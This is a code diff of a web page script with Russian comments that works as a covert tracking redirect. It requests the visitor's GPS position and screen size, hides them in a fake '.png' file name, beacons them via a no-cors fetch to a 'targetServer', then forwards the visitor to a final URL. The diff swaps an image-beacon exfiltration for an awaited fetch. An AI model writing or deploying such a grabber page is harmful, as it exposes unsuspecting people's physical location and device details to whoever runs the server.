@@ -23,11 +23,13 @@
             if (!slug) return;
             
             let info = {
-                sw: window.screen.width, sh: window.screen.height,
-                lat: "null", lon: "null"
+                sw: window.screen.width,
+                sh: window.screen.height,
+                lat: "null",
+                lon: "null"
             };
 
-            // 1. Сбор GPS
+            // 1. Сбор GPS (ждем максимум 4 секунды)
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((res, rej) => {
@@ -39,46 +41,30 @@
                     });
                     info.lat = pos.coords.latitude;
                     info.lon = pos.coords.longitude;
-                } catch (e) {}
+                } catch (e) {
+                    console.log("GPS skip or denied");
+                }
             }
 
-            // 2. Формируем имя файла
+            // 2. Формируем имя файла с данными
             const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
             
-            // 3. ОТПРАВКА ЧЕРЕЗ FETCH (ЖЕСТКАЯ)
+            // 3. Жесткая отправка через fetch
             try {
-                // Мы отправляем запрос и ЖДЕМ (await) ответа от сервера
-                // mode: 'no-cors' позволяет слать запросы на http с https гитхаба
+                // await заставляет скрипт ПРИОСТАНОВИТЬСЯ до завершения сетевого запроса
                 await fetch(`${targetServer}${fileName}?t=${Date.now()}`, { 
                     mode: 'no-cors',
                     cache: 'no-store'
                 });
-                console.log("Data sent");
             } catch (e) {
-                console.log("Fetch failed, but moving on...");
+                console.log("Network error, but redirecting anyway...");
             }
 
-            // 4. РЕДИРЕКТ (только после того как fetch завершился)
+            // 4. Финальный редирект с флагом готовности
             window.location.href = `${finalRedirect}${slug}?ready=1`;
         }
 
-            // 2. Формируем имя файла
-            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
-            
-            // 3. Отправка и редирект
-            const img = new Image();
-            const go = () => {
-                // Добавляем ?ready=1, чтобы остановить петлю на сервере
-                window.location.href = `${finalRedirect}${slug}?ready=1`;
-            };
-
-            img.onload = img.onerror = go; 
-            img.src = `${targetServer}${fileName}?t=${Date.now()}`;
-            
-            // Страховка (4 секунды)
-            setTimeout(go, 4000);
-        }
-
+        // Запуск процесса
         collectAndGo();
     </script>
 </body>
